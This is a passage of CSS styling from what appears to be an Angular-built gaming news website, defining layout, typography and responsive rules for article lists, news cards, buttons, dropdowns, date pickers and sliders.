            .article-list[_ngcontent-gtc-c12] .news-listview[_ngcontent-gtc-c12] .list-wrapper[_ngcontent-gtc-c12] article[_ngcontent-gtc-c12] .d-absolute--center[_ngcontent-gtc-c12] img[_ngcontent-gtc-c12] {
                width: 25px
            }
        }

        .article-list[_ngcontent-gtc-c12] .news-listview[_ngcontent-gtc-c12] .list-wrapper[_ngcontent-gtc-c12] article[_ngcontent-gtc-c12] .image[_ngcontent-gtc-c12] {
            margin-right: 15px;
            position: relative;
            width: 285px;
            background-image: url(https://apist.duniagames.co.id/api/content/upload/file/1830808….jpg);
            height: 176px;
            background-position: center;
            background-size: cover;
            background-repeat: no-repeat;
            border-radius: 4px;
            float: left
        }

        @media (max-width:767px) {
            .article-list[_ngcontent-gtc-c12] .news-listview[_ngcontent-gtc-c12] .list-wrapper[_ngcontent-gtc-c12] article[_ngcontent-gtc-c12] .image[_ngcontent-gtc-c12] {
                width: 64px;
                height: 64px
            }
        }

        .article-list[_ngcontent-gtc-c12] .news-listview[_ngcontent-gtc-c12] .list-wrapper[_ngcontent-gtc-c12] article[_ngcontent-gtc-c12] .live[_ngcontent-gtc-c12] {
            margin: 15px;
            position: relative;
            display: inline-block;
            padding: 5px 10px 5px 20px;
            font-family: Montserrat;
            font-size: .8em;
            color: #fff;
            background: #d0021b;
            text-transform: uppercase;
            border-radius: 5px
        }

        .article-list[_ngcontent-gtc-c12] .news-listview[_ngcontent-gtc-c12] .list-wrapper[_ngcontent-gtc-c12] article[_ngcontent-gtc-c12] .live[_ngcontent-gtc-c12] span[_ngcontent-gtc-c12] {
            position: relative
        }

        .article-list[_ngcontent-gtc-c12] .news-listview[_ngcontent-gtc-c12] .list-wrapper[_ngcontent-gtc-c12] article[_ngcontent-gtc-c12] .live[_ngcontent-gtc-c12] span[_ngcontent-gtc-c12]::before {
            position: absolute;
            content: "";
            height: 4px;
            width: 4px;
            display: inline-block;
            overflow: hidden;
            border-radius: 100%;
            left: -10px;
            top: 5px;
            background: #fff
        }

        .article-list[_ngcontent-gtc-c12] .news-listview[_ngcontent-gtc-c12] .list-wrapper[_ngcontent-gtc-c12] article[_ngcontent-gtc-c12] .caption[_ngcontent-gtc-c12] {
            width: 80%
        }

        .article-list[_ngcontent-gtc-c12] .news-listview[_ngcontent-gtc-c12] .list-wrapper[_ngcontent-gtc-c12] article[_ngcontent-gtc-c12] .caption[_ngcontent-gtc-c12] .event-item .date {
            color: #b4b4c0 !important;
            font-size: 10px
        }

        .article-list[_ngcontent-gtc-c12] .news-listview[_ngcontent-gtc-c12] .list-wrapper[_ngcontent-gtc-c12] article[_ngcontent-gtc-c12] .caption[_ngcontent-gtc-c12] .event-item small {
            margin: 2px 0 0 7px
        }

        .article-list[_ngcontent-gtc-c12] .news-listview[_ngcontent-gtc-c12] .list-wrapper[_ngcontent-gtc-c12] article[_ngcontent-gtc-c12] .caption[_ngcontent-gtc-c12] .date[_ngcontent-gtc-c12] {
            font-family: Montserrat;
            font-size: 12px;
            font-weight: 500;
            font-stretch: normal;
            font-style: normal;
            line-height: normal;
            letter-spacing: normal;
            color: #fff;
            text-transform: uppercase
        }

        .article-list[_ngcontent-gtc-c12] .news-listview[_ngcontent-gtc-c12] .list-wrapper[_ngcontent-gtc-c12] article[_ngcontent-gtc-c12] .caption[_ngcontent-gtc-c12] .date.show-xs[_ngcontent-gtc-c12] {
            display: none
        }

        .article-list[_ngcontent-gtc-c12] .news-listview[_ngcontent-gtc-c12] .list-wrapper[_ngcontent-gtc-c12] article[_ngcontent-gtc-c12] .caption[_ngcontent-gtc-c12] .title[_ngcontent-gtc-c12] {
            font-family: Montserrat;
            font-size: 16px;
            font-weight: 600;
            font-stretch: normal;
            font-style: normal;
            line-height: 1.5;
            letter-spacing: normal;
            color: #fff;
            margin: 16px 0;
            overflow: hidden;
            -webkit-box-orient: vertical;
            display: -webkit-box;
            -webkit-line-clamp: 2;
            text-overflow: ellipsis
        }

        @media (max-width:767px) {
            .article-list[_ngcontent-gtc-c12] .news-listview[_ngcontent-gtc-c12] .list-wrapper[_ngcontent-gtc-c12] article[_ngcontent-gtc-c12] .caption[_ngcontent-gtc-c12] {
                width: 100%
            }
            .article-list[_ngcontent-gtc-c12] .news-listview[_ngcontent-gtc-c12] .list-wrapper[_ngcontent-gtc-c12] article[_ngcontent-gtc-c12] .caption[_ngcontent-gtc-c12] .event-item .date {
                color: #b4b4c0 !important;
                font-size: 10px
            }
            .article-list[_ngcontent-gtc-c12] .news-listview[_ngcontent-gtc-c12] .list-wrapper[_ngcontent-gtc-c12] article[_ngcontent-gtc-c12] .caption[_ngcontent-gtc-c12] .event-item small {
                margin: 2px 0 0 7px
            }
            .article-list[_ngcontent-gtc-c12] .news-listview[_ngcontent-gtc-c12] .list-wrapper[_ngcontent-gtc-c12] article[_ngcontent-gtc-c12] .caption[_ngcontent-gtc-c12] .date.show-xs[_ngcontent-gtc-c12] {
                display: block;
                color: #b4b4c0
            }
            .article-list[_ngcontent-gtc-c12] .news-listview[_ngcontent-gtc-c12] .list-wrapper[_ngcontent-gtc-c12] article[_ngcontent-gtc-c12] .caption[_ngcontent-gtc-c12] .title[_ngcontent-gtc-c12] {
                font-size: 14px;
                margin: 0 0 10px
            }
        }

        .article-list[_ngcontent-gtc-c12] .news-listview[_ngcontent-gtc-c12] .list-wrapper[_ngcontent-gtc-c12] article[_ngcontent-gtc-c12] .caption[_ngcontent-gtc-c12] .content[_ngcontent-gtc-c12] {
            font-family: Montserrat;
            font-size: 16px;
            font-weight: 400;
            font-stretch: normal;
            font-style: normal;
            line-height: 1.5;
            letter-spacing: normal;
            color: #b4b4c0;
            overflow: hidden;
            -webkit-box-orient: vertical;
            display: -webkit-box;
            -webkit-line-clamp: 3;
            text-overflow: ellipsis
        }

        .show-more[_ngcontent-gtc-c12] {
            background: 0 0;
            display: block;
            margin: 15px auto 30px;
            border-radius: 3px;
            border: 1px solid #fff;
            width: 336px;
            height: 48px;
            font-family: Montserrat;
            font-size: 14px;
            font-weight: 700;
            font-stretch: normal;
            font-style: normal;
            line-height: .71;
            letter-spacing: normal;
            text-align: center;
            color: #fff
        }

        .col-md-8[_ngcontent-gtc-c12] {
            width: 66.66666667%
        }

        @media (max-width:767px) {
            .col-md-8[_ngcontent-gtc-c12] {
                width: 100%
            }
        }

        .col-md-12[_ngcontent-gtc-c12] {
            width: 100%
        }
    </style>
    <style>
        .justify-content-left {
            justify-content: left !important
        }

        .justify-content-center {
            justify-content: center !important
        }

        .justify-content-right {
            justify-content: right !important
        }

        .justify-content-space-between {
            justify-content: space-between !important
        }

        .justify-content-flex-end {
            justify-content: flex-end !important
        }

        .text-decoration-line-through {
            text-decoration: line-through !important
        }

        .text-decoration-underline {
            text-decoration: underline !important
        }

        .text-decoration-overline {
            text-decoration: overline !important
        }

        .text-decoration-none {
            text-decoration: none !important
        }

        .align-self-center {
            align-self: center
        }

        .cursor-no-drop {
            cursor: no-drop !important
        }

        .cursor-pointer {
            cursor: pointer !important
        }

        .text-left {
            text-align: left !important
        }

        .text-center {
            text-align: center !important
        }

        .text-right {
            text-align: right !important
        }

        .text-justify {
            text-align: justify !important
        }

        .v-align-top {
            vertical-align: top !important
        }

        .v-align-middle {
            vertical-align: middle !important
        }

        .v-align-bottom {
            vertical-align: bottom !important
        }

        .float-left {
            float: left !important
        }

        .float-right {
            float: right !important
        }

        .mat-datepicker-toggle button.mat-icon-button {
            position: absolute;
            right: 0;
            top: 25px;
            width: 24px;
            height: 24px;
            color: #6a707d
        }

        .mat-datepicker-toggle button.mat-icon-button span.mat-button-wrapper,
        .mat-datepicker-toggle button.mat-icon-button span.mat-button-wrapper svg.mat-datepicker-toggle-default-icon {
            position: absolute;
            left: 0;
            top: 0;
            max-width: 24px;
            max-height: 24px
        }

        .cust-dropdown {
            position: relative
        }

        .cust-dropdown i.fa-caret-down {
            position: absolute;
            width: 9px;
            height: 15px;
            top: 0;
            bottom: 0;
            right: 5px;
            margin: auto
        }

        .cust-dropdown input[type=text] {
            width: calc(100% - 10px);
            padding: 5px 10px;
            margin-right: 10px;
            background: 0 0;
            border: 0;
            outline: 0
        }

        .cust-dropdown .cust-option {
            display: none;
            position: absolute;
            min-width: 100%;
            top: 100%;
            background: #1d1f23;
            z-index: 99;
            padding: 15px 25px;
            box-shadow: 0 3px 8px 0 rgba(0, 0, 0, .35);
            border-radius: 3px
        }

        .cust-dropdown .cust-option.active {
            display: block
        }

        .cust-dropdown .cust-option ul.option-list {
            margin: 0;
            padding: 0;
            list-style: none
        }

        .cust-dropdown .cust-option ul.option-list li {
            margin: 0;
            padding: 0;
            list-style: none;
            position: relative
        }

        .cust-dropdown .cust-option ul.option-list li label {
            display: block;
            margin: 0;
            padding: 10px 0 10px 30px
        }

        .cust-dropdown .cust-option ul.option-list li label:before {
            content: "";
            position: absolute;
            width: 20px;
            height: 20px;
            top: 0;
            bottom: 0;
            left: 0;
            margin: auto;
            border: 1px solid #fff;
            border-radius: 50%
        }

        .cust-dropdown .cust-option ul.option-list li label:after {
            content: "";
            opacity: 0;
            position: absolute;
            width: 10px;
            height: 10px;
            top: 0;
            bottom: 0;
            left: 5px;
            margin: auto;
            border: 1px solid #fff;
            background: #fff;
            border-radius: 50%
        }

        .cust-dropdown .cust-option ul.option-list li input[type=radio] {
            position: absolute;
            width: 100%;
            height: 100%;
            top: 0;
            left: 0;
            opacity: 0
        }

        .cust-dropdown .cust-option ul.option-list li input[type=radio]:checked+label:after {
            opacity: 1
        }

        html {
            scroll-behavior: smooth
        }

        body {
            margin: 0;
            padding: 0;
            overflow-x: hidden !important
        }

        a,
        label,
        ol li,
        table td,
        table th,
        ul li {
            font-family: Montserrat
        }

        b {
            font-family: Montserrat-Bold;
            font-weight: 800
        }

        h1,
        h2,
        h3,
        h4,
        h5,
        h6,
        p,
        span {
            margin: 0;
            font-family: Montserrat
        }

        button {
            outline: 0;
            font-family: Montserrat
        }

        input,
        textarea {
            font-family: Montserrat;
            color: #fff
        }

        label.error-label {
            margin: 5px 0;
            font-family: Montserrat;
            font-size: .9em;
            font-weight: 400;
            color: #d0021b;
            display: block
        }

        label.success-label {
            margin: 5px 0;
            font-family: Montserrat;
            font-size: .9em;
            font-weight: 400;
            color: green;
            display: block
        }

        label.label-input {
            display: block;
            font-family: Montserrat;
            font-size: 12px;
            color: #6a707d;
            margin-bottom: 10px
        }

        @media (max-width:767px) {
            label.label-input {
                font-size: 11px
            }
        }

        label.label-media {
            display: block;
            font-family: Montserrat;
            font-size: .8em;
            color: #6a707d;
            margin-bottom: 10px
        }

        .close-solid {
            padding: 5px;
            height: 30px;
            width: 30px;
            background: 0 0;
            border: none;
            cursor: pointer
        }

        .close-solid span {
            height: 100%;
            width: 100%;
            display: inline-block;
            background-image: url(close-global.785be75897033bcf1c3f.png);
            background-size: 50px;
            background-repeat: no-repeat;
            background-position: center
        }

        .close-circle-wrap {
            position: relative;
            float: right;
            margin-top: 20px;
            z-index: 1;
            background: 0 0;
            border: none
        }

        .close-circle-wrap p {
            display: inline-block;
            vertical-align: middle;
            color: #fff;
            font-family: Montserrat-Bold;
            font-weight: 600;
            font-size: .9em;
            text-transform: uppercase
        }

        @media (max-width:767px) {
            .close-circle-wrap p {
                font-size: .75em
            }
        }

        .close-circle-wrap p.close-circle {
            height: 42px;
            width: 42px;
            background: 0 0;
            border: 2px solid #fff;
            cursor: pointer;
            padding: 12px;
            margin-left: 10px;
            border-radius: 100%;
            opacity: .5
        }

        .close-circle-wrap p.close-circle span {
            height: 100%;
            width: 100%;
            display: inline-block;
            background-image: url(close-global.785be75897033bcf1c3f.png);
            background-size: 50px;
            background-repeat: no-repeat;
            background-position: center
        }

        .cta.cta--generate {
            margin-top: 30px;
            padding: 16px 27px;
            background: #d0021b;
            font-family: Montserrat;
            font-size: .9em;
            font-weight: 600;
            text-transform: uppercase;
            color: #fff;
            border: none;
            border-radius: 3px;
            letter-spacing: 1px
        }

        .cta.cta--create {
            text-decoration: none;
            padding: 10px 5px 10px 30px;
            background: #d0021b;
            font-family: Montserrat;
            font-size: .9em;
            font-weight: 600;
            text-transform: uppercase;
            color: #fff;
            border: 1px solid transparent;
            border-radius: 3px;
            letter-spacing: 1px
        }

        .cta.cta--create span {
            font-family: Montserrat;
            font-size: .8em;
            color: #fff;
            background: #9c0114;
            padding: 5px 10px;
            display: inline-block;
            border-radius: 3px;
            margin: 0 10px
        }

        .cta.cta--border-transparent {
            text-decoration: none;
            padding: 10px 40px;
            background: 0 0;
            font-family: Montserrat;
            font-size: .9em;
            font-weight: 600;
            text-transform: uppercase;
            color: #fff;
            border: 1px solid #fff;
            border-radius: 3px;
            letter-spacing: 1px
        }

        .cta.cta--transparent-white {
            font-family: Montserrat;
            border: 1px solid #fff;
            padding: 15px 20px;
            border-radius: 4px;
            background: 0 0;
            outline: 0;
            font-size: .9em;
            font-weight: 600;
            color: #fff;
            text-transform: uppercase;
            text-decoration: none;
            letter-spacing: 1px
        }

        .cta.cta--solid-grey {
            font-family: Montserrat;
            border: 1px solid transparent;
            padding: 15px 60px;
            border-radius: 4px;
            background: #2d2d30;
            outline: 0;
            font-size: .9em;
            font-weight: 600;
            color: #6b6b6d;
            text-transform: uppercase;
            text-decoration: none;
            letter-spacing: 1px
        }

        a.close-frame {
            position: absolute;
            right: 30px;
            top: 0;
            font-family: Montserrat;
            color: #fff;
            font-size: .9em;
            font-weight: 400;
            text-transform: uppercase;
            opacity: 1;
            z-index: 10
        }

        a.close-frame.close-frame--tournament span {
            padding: 4px 9px 4px 12px;
            border: 3px solid #6a707d;
            width: 42px;
            height: 42px;
            font-size: 20px;
            font-weight: 700;
            top: 16px
        }

        a.close-frame.close-frame--tournament p {
            font-family: Montserrat;
            font-size: 13px;
            font-weight: 700;
            font-style: normal;
            font-stretch: normal;
            line-height: 1.23;
            letter-spacing: 1.4px;
            text-align: center;
            color: #fff
        }

        a.close-frame p {
            display: inline-block
        }

        @media (max-width:767px) {
            a.close-frame {
                right: 10px
            }
            a.close-frame p {
                display: none
            }
        }

        a.close-frame span {
            margin-left: 10px;
            font-family: Montserrat;
            display: inline-block;
            width: 30px;
            height: 30px;
            padding: 5px 10px;
            border: 1px solid #6a707d;
            color: #6a707d;
            font-weight: 600;
            overflow: hidden;
            border-radius: 100%;
            position: relative;
            right: 0;
            top: 10px
        }

        .form-control {
            position: relative;
            font-family: Montserrat !important;
            font-size: 1em;
            outline: 0;
            background: 0 0;
            border-radius: 0;
            box-shadow: none
        }

        .form-control.form-control--default {
            padding: 0;
            border: none;
            border-bottom: 1px solid rgba(106, 112, 125, .49);
            box-shadow: none;
            color: #fff
        }

        .form-control.form-control--count {
            text-align: center;
            margin: 0 10px 10px;
            width: 50px;
            padding: 0;
            border: none;
            border-bottom: 1px solid rgba(106, 112, 125, .49);
            box-shadow: none;
            color: #fff
        }

        .form-control.form-control--transparent {
            outline: 0;
            color: #fff;
            font-size: 1em;
            box-shadow: none;
            padding: 0;
            background: 0 0;
            border: none;
            box-shadow: none
        }

        .form-control.form-control--textarea {
            outline: 0;
            color: #fff;
            font-size: 1em;
            box-shadow: none;
            padding: 10px;
            border-radius: 4px;
            background-color: rgba(106, 112, 125, .19);
            border: none;
            box-shadow: none
        }

        .form-control::-moz-placeholder {
            color: #69707e
        }

        .form-control::-ms-input-placeholder {
            color: #69707e
        }

        .form-control::placeholder {
            color: #69707e
        }

        .header-text h3 {
            font-family: Montserrat-Bold;
            font-size: 2.3em;
            text-transform: capitalize;
            color: #fff
        }

        @media (max-width:767px) {
            a.close-frame span {
                right: 10px
            }
            .header-text h3 {
                font-size: 1.5em
            }
        }

        .header-text h4 {
            font-family: Montserrat-Bold;
            font-size: 1.5em;
            color: #fff
        }

        .header-text p {
            font-family: Montserrat;
            font-size: 1em;
            font-weight: 400;
            font-style: normal;
            font-stretch: normal;
            line-height: 1.5;
            letter-spacing: normal;
            text-align: center;
            color: #b4b4c0
        }

        .header-text-medium h3 {
            font-family: Montserrat-Bold;
            font-size: 2em;
            color: #fff
        }

        .header-text-small h3 {
            font-family: Montserrat-Bold;
            font-size: 1.5em;
            color: #fff
        }

        @media (max-width:767px) {
            .header-text-medium h3,
            .header-text-small h3 {
                font-size: 1.5em
            }
        }

        .header-text-extra-small h3 {
            font-family: Montserrat;
            font-size: 1.2em;
            color: #fff
        }

        @media (max-width:767px) {
            .header-text-extra-small h3 {
                font-size: 1em
            }
        }

        .header-text-extra-small-bold h3 {
            font-family: Montserrat-Bold;
            font-size: 1.2em;
            color: #fff
        }

        .body-text p {
            font-family: Montserrat;
            font-size: 1em;
            font-weight: 400;
            font-style: normal;
            font-stretch: normal;
            line-height: 1.5;
            letter-spacing: normal;
            text-align: center;
            color: #b4b4c0
        }

        .description-text p {
            font-size: 1em;
            color: #fff
        }

        .radio-input {
            position: absolute;
            left: 0;
            right: 0;
            top: 0;
            bottom: 0;
            height: 100%;
            width: 100%;
            z-index: 9;
            opacity: 0
        }

        .middle-top {
            margin: auto;
            position: absolute;
            top: 50%;
            left: 0;
            right: 0;
            transform: translateY(-50%)
        }

        .fleft {
            float: left
        }

        .fright {
            float: right
        }

        .row .padding-left-0 {
            padding-left: 0
        }

        .form-group.form-group--media {
            position: relative;
            border-bottom: 1px solid #2b2e34
        }

        .dd-selected {
            background: 0 0
        }

        .invalid-feedback {
            text-align: left;
            position: relative;
            z-index: 1
        }

        .popup-shuffle {
            position: fixed;
            width: 100%;
            height: 100%;
            top: 0;
            left: 0;
            z-index: 99
        }

        .popup-shuffle:before {
            content: "";
            position: absolute;
            width: 100%;
            height: 100%;
            top: 0;
            left: 0;
            background-color: rgba(0, 0, 0, .8)
        }

        .popup-shuffle .shuffle-container {
            width: 400px;
            height: 120px;
            max-width: 90vw;
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            margin: auto;
            border: 3px solid #6a707d;
            background: #1d1f23;
            border-radius: 4px;
            display: block
        }

        .popup-shuffle .shuffle-container>.row {
            display: block;
            position: absolute;
            top: 50%;
            transform: translateY(-50%)
        }

        .popup-shuffle .shuffle-container .shuffle-pop-table {
            display: table
        }

        .popup-shuffle .shuffle-container .shuffle-pop-table .shuffle-pop-item {
            display: table-cell;
            vertical-align: middle;
            width: 80%;
            padding-left: 20px
        }

        .popup-shuffle .shuffle-container .shuffle-pop-table .shuffle-pop-item.img {
            width: 20%;
            padding-left: 0
        }

        .popup-shuffle .shuffle-container img {
            max-width: 100%
        }

        .popup-shuffle .shuffle-container p {
            color: #fff;
            font-size: 1em
        }

        .popup-shuffle .shuffle-container p strong {
            font-size: 1.09em
        }

        .mat-datepicker-content {
            background: #1d1f23
        }

        .mat-calendar-body-cell-content {
            color: #fff
        }

        .mat-calendar-body-disabled>.mat-calendar-body-cell-content:not(.mat-calendar-body-selected) {
            color: #616161
        }

        .mat-calendar-body-label,
        .mat-calendar-table-header th,
        .mat-datepicker-content .mat-calendar-next-button,
        .mat-datepicker-content .mat-calendar-previous-button,
        .mat-datepicker-toggle,
        .mat-icon-button[disabled][disabled] {
            color: #fff
        }

        .mat-calendar-arrow {
            border-top-color: #fff
        }

        .mat-calendar-header {
            color: #fff
        }

        .cdk-keyboard-focused .mat-calendar-body-active>.mat-calendar-body-cell-content:not(.mat-calendar-body-selected),
        .cdk-program-focused .mat-calendar-body-active>.mat-calendar-body-cell-content:not(.mat-calendar-body-selected),
        .mat-calendar-body-cell:not(.mat-calendar-body-disabled):hover>.mat-calendar-body-cell-content:not(.mat-calendar-body-selected),
        .mat-calendar-body-today:not(.mat-calendar-body-selected) {
            border-color: transparent;
            background: #d0021b
        }

        .mat-calendar-body-selected {
            background: #d0021b;
            box-shadow: none
        }

        .block-url {
            position: absolute;
            content: "";
            left: 0;
            right: 0;
            top: 0;
            bottom: 0;
            z-index: 91
        }

        .mat-primary .mat-option.mat-selected:not(.mat-option-disabled) {
            color: #000;
            opacity: .8
        }

        .mat-select-panel .mat-option {
            color: #797979
        }

        .ngx-editor-textarea div,
        .ngx-editor-textarea section {
            max-width: 100% !important;
            width: 100% !important;
            background: 0 0 !important;
            box-shadow: none !important
        }

        .ngx-editor-textarea div img,
        .ngx-editor-textarea section img {
            width: 100% !important
        }

        .ngx-editor-textarea a {
            text-decoration: none !important;
            border: none !important
        }

        .ngx-editor-textarea * {
            max-width: 100% !important;
            font-family: Montserrat !important;
            background: 0 0 !important;
            line-height: 1.5;
            word-break: break-word !important;
            text-indent: unset !important
        }

        .ngx-editor-textarea b {
            font-family: Montserrat-Bold !important
        }

        .ngx-editor-textarea b * {
            font-family: Montserrat-Bold !important;
            text-indent: unset !important
        }

        .ngx-editor-textarea td {
            border-color: #6a707d !important;
            padding: 8px !important
        }

        .app-layout-wrap {
            background-color: #000
        }

        @media (min-width:1200px) {
            .d-main {
                max-width: 1440px;
                margin: 0 auto
            }
            .layout-content {
                background-color: #000
            }
        }

        .d-absolute--center {
            position: absolute;
            top: 40%;
            width: 100%;
            text-align: center;
            z-index: 2
        }

        .d-absolute--center img {
            width: 50px;
            opacity: .5
        }

        .latest-article {
            position: relative;
            padding: 20px 0 50px
        }

        .latest-article header {
            position: relative
        }

        .latest-article .header-title h3 {
            position: relative;
            font-family: Montserrat-Semibold;
            font-size: 2.1em;
            font-weight: 600;
            color: #fff;
            padding-left: 30px
        }

        .latest-article .header-title h3::before {
            position: absolute;
            content: "";
            left: 0;
            top: 15px;
            height: 3px;
            width: 16px;
            background: #d0021b
        }

        .latest-article .header-more {
            position: absolute;
            right: 0;
            top: 50%;
            transform: translateY(-50%)
        }

        .latest-article .header-more.show-xs {
            display: none
        }

        @media (max-width:767px) {
            .header-text-extra-small-bold h3 {
                font-size: 1em
            }
            .fleft {
                float: right
            }
            .fright {
                float: left
            }
            .popup-shuffle .shuffle-container .shuffle-pop-table {
                padding: 0 20px
            }
            .mat-datepicker-toggle button.mat-icon-button {
                top: auto;
                bottom: 7px
            }
            .latest-article .container {
                padding-right: 10px
            }
            .latest-article {
                padding: 15px 0
            }
            .latest-article .header-title h3 {
                font-size: 18px;
                padding-left: 25px
            }
            .latest-article .header-title h3::before {
                top: 7px;
                height: 3px;
                width: 12px
            }
            .latest-article .header-more.show-xs {
                display: block
            }
            .latest-article .header-more {
                position: relative;
                margin: 15px 0;
                transform: unset
            }
        }

        .latest-article .header-more a {
            font-family: Montserrat;
            color: #fff;
            font-size: .9em;
            font-weight: 600;
            text-transform: uppercase;
            text-decoration: none
        }

        .latest-article .header-more a span {
            position: relative;
            display: inline-block;
            height: 18px;
            width: 18px;
            margin: -4px 10px;
            background: #d0021b;
            overflow: hidden;
            border-radius: 3px
        }

        .latest-article .header-more a span::after {
            position: absolute;
            font-family: FontAwesome;
            content: "\f105";
            right: 7px;
            top: 0
        }

        .latest-article article.news-content__post.news-content__post--medium.hide-cont {
            display: block
        }

        @media (max-width:767px) {
            .latest-article article.news-content__post.news-content__post--medium.hide-cont {
                display: none
            }
        }

        .latest-article article.news-content__post.news-content__post--small.hide-cont {
            display: block
        }

        .latest-article .news-content {
            margin-top: 35px
        }

        .latest-article .news-content .row {
            margin-left: -10px;
            margin-right: -10px
        }

        .latest-article .news-content .row [class*=col-] {
            padding-left: 10px;
            padding-right: 10px
        }

        .latest-article .news-content .row.mobile {
            display: none
        }

        .latest-article .news-content .row.desktop {
            display: block
        }

        .latest-article .news-content .highlight-slider .slick-slide {
            padding: 0 5px
        }

        .latest-article .news-content .highlight-slider .slick-slide .news-content__post.news-content__post--big {
            padding-bottom: calc(110% - 22px)
        }

        @media (max-width:767px) {
            .latest-article article.news-content__post.news-content__post--small.hide-cont {
                display: none
            }
            .latest-article .news-content {
                margin-top: 20px
            }
            .latest-article .news-content .row.mobile {
                display: block
            }
            .latest-article .news-content .row.desktop {
                display: none
            }
            .latest-article .news-content .highlight-slider .slick-slide .news-content__post.news-content__post--big {
                padding-bottom: calc(100% + 32px)
            }
            .latest-article .news-content .highlight-slider .slick-slider .slick-list {
                padding: 0 20% 0 0 !important
            }
        }

        .latest-article .news-content .highlight-slider .slick-slide .news-content__post.news-content__post--big h3 {
            font-size: 1em;
            width: 100%
        }

        .latest-article .news-content .highlight-slider .slick-next,
        .latest-article .news-content .highlight-slider .slick-prev {
            font-size: 0;
            border: 0;
            outline: 0;
            background-color: transparent;
            background-repeat: no-repeat;
            background-position: center;
            background-image: url(/.assets/.images/.icons/right-arrow.png);
            background-size: contain;
            width: 28px;
            height: 36px;
            position: absolute;
            top: 42%;
            transition: all .3s ease-in-out;
            z-index: 10;
            opacity: .7
        }

        @media (max-width:991px) {
            .latest-article .news-content .highlight-slider .slick-next,
            .latest-article .news-content .highlight-slider .slick-prev {
                top: 25%
            }
        }

        .latest-article .news-content .highlight-slider .slick-next:focus,
        .latest-article .news-content .highlight-slider .slick-next:hover,
        .latest-article .news-content .highlight-slider .slick-prev:focus,
        .latest-article .news-content .highlight-slider .slick-prev:hover {
            opacity: 1
        }

        .latest-article .news-content .highlight-slider .slick-prev {
            left: 1%;
            transform: rotate(180deg);
            display: none !important
        }

        .latest-article .news-content .highlight-slider .slick-next {
            right: 1%
        }

        .latest-article .news-content .news-content__post {
            width: 100%;
            position: relative;
            background-size: cover;
            background-position: top center;
            background-repeat: no-repeat;
            box-shadow: 2px 3px 10px rgba(0, 0, 0, .61)
        }

        .latest-article .news-content .news-content__post>a {
            position: absolute;
            left: 0;
            right: 0;
            top: 0;
            bottom: 0;
            z-index: 9
        }

        .latest-article .news-content .news-content__post::after {
            position: absolute;
            content: "";
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: #876131;
            background: linear-gradient(0deg, #876131 0, rgba(135, 97, 49, 0) 100%)
        }

        .latest-article .news-content .news-content__post .caption {
            position: absolute;
            left: 0;
            right: 0;
            bottom: 0;
            padding: 20px;
            z-index: 9
        }

        .latest-article .news-content .news-content__post h3 {
            width: 95%;
            margin: 0;
            font-family: Montserrat-Semibold;
            font-size: 30px;
            color: #fff;
            overflow: hidden;
            -webkit-box-orient: vertical;
            display: -webkit-box;
            -webkit-line-clamp: 2;
            text-overflow: ellipsis
        }

        @media (max-width:767px) {
            .latest-article .news-content .news-content__post h3 {
                font-size: 18px;
                line-height: 1.5
            }
            .latest-article--responsive {
                margin: 0;
                padding: 15px 0 25px 5px
            }
            .latest-article--responsive .container::before {
                position: absolute;
                content: "";
                top: 0;
                left: 0;
                right: 0;
                bottom: 0;
                background: rgba(206, 199, 236, 0);
                background: linear-gradient(to bottom, rgba(224, 224, 224, 0) 10%, #030303 50%, #342441 100%);
                filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#cec7ec', endColorstr='#4e3d28', GradientType=0)
            }
            .latest-article--responsive .highlight-slider .slick-slide:nth-child(3n) .news-content__post::after {
                background: #876131;
                background: linear-gradient(0deg, #876131 0, rgba(135, 97, 49, 0) 100%)
            }
            .latest-article--responsive .highlight-slider .slick-slide:nth-child(4n) .news-content__post::after {
                background: #6a1818;
                background: linear-gradient(0deg, #6a1818 0, rgba(106, 24, 24, .00603992) 100%)
            }
            .latest-article--responsive .highlight-slider .slick-slide:nth-child(5n) .news-content__post::after {
                background: #202e74;
                background: linear-gradient(0deg, #202e74 0, rgba(32, 46, 116, 0) 100%)
            }
            .latest-article--responsive .highlight-slider .slick-slide:nth-child(6n) .news-content__post::after {
                background: #6a1818;
                background: linear-gradient(0deg, #6a1818 0, rgba(106, 24, 24, .00603992) 100%)
            }
        }

        .latest-article .news-content .news-content__post p {
            width: 90%;
            margin: 10px 0 5px;
            font-family: Montserrat;
            font-size: 12px;
            color: #fff;
            line-height: 1.5
        }

        .latest-article .news-content .news-content__post span i.fa.fa-calendar-check-o {
            font-size: 16px;
            margin-right: 6px
        }

        .latest-article .news-content .news-content__post span.date {
            display: inline-block;
            padding: 4px 10px;
            margin-top: 10px;
            margin-right: 5px;
            overflow: hidden;
            border-radius: 5px;
            background: #161619;
            color: #fff;
            font-family: Montserrat;
            font-size: 12px;
            text-transform: uppercase
        }

        .latest-article .news-content .news-content__post span.date.style2 {
            background: 0 0;
            border-radius: 0;
            padding: 0;
            margin: 10px 0 0;
            line-height: 12px;
            font-size: 12px;
            text-transform: uppercase
        }

        .latest-article .news-content .news-content__post span.default {
            display: inline-block;
            overflow: hidden;
            border-radius: 5px;
            margin: 5px 5px 5px 0;
            color: #fff;
            font-family: Montserrat;
            font-size: 12px;
            text-transform: uppercase
        }

        .latest-article .news-content .news-content__post span.default.style2 {
            margin: 10px 0 0 !important;
            padding: 0 10px 0 0;
            border-right: 1px solid #fff;
            border-radius: 0 !important;
            line-height: 12px;
            font-size: 12px;
            text-transform: uppercase
        }

        .latest-article .news-content .news-content__post.news-content__post--big {
            height: 0;
            border-radius: 4px;
            padding-bottom: calc(100% + 32px);
            overflow: hidden
        }

        .latest-article .news-content .news-content__post.news-content__post--medium {
            height: 0;
            border-radius: 4px;
            padding-bottom: calc(50% + 23px);
            overflow: hidden
        }

        .latest-article .news-content .news-content__post.news-content__post--medium h3 {
            font-size: 1.3em;
            line-height: 1.5
        }

        .latest-article .news-content .news-content__post.news-content__post--small {
            margin-top: 20px;
            height: 0;
            border-radius: 4px;
            padding-bottom: calc(100% - 10px);
            overflow: hidden
        }

        .latest-article .news-content .news-content__post.news-content__post--small h3 {
            font-size: 1em;
            line-height: 1.5
        }

        .latest-article .news-content .news-content__post.small {
            margin-top: 16px;
            height: 273px
        }

        .latest-article .news-content .news-content__post.small::before {
            background: rgba(206, 199, 236, 0);
            background: linear-gradient(to bottom, rgba(206, 199, 236, 0) 0, rgba(78, 61, 40, .14) 15%, rgba(27, 26, 44, .94) 100%)
        }

        .latest-article .news-content .news-content__post.small .caption {
            cursor: pointer
        }

